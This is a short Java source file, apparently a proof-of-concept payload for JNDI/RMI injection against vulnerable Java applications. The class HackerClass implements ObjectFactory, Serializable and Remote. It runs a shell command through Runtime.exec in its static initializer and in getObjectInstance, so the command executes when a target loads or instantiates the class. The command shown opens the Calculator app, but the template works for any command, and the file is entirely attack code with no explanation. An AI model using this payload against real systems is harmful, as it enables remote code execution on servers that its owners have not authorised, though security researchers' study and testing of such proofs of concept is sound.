

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.Serializable;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.Hashtable;

/**
 * @author zhanghaoyang
 */
public class HackerClass implements Serializable, ObjectFactory, Remote {
    protected HackerClass() throws RemoteException {
        UnicastRemoteObject.exportObject(this, 0);
    }

    static {
        try {
            Runtime.getRuntime().exec("open /System/Applications/Calculator.app");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    @Override
    public Object getObjectInstance(Object o, Name name, Context context, Hashtable<?, ?> hashtable) throws Exception {
        Runtime.getRuntime().exec("open /System/Applications/Calculator.app");
        return null;
    }
}
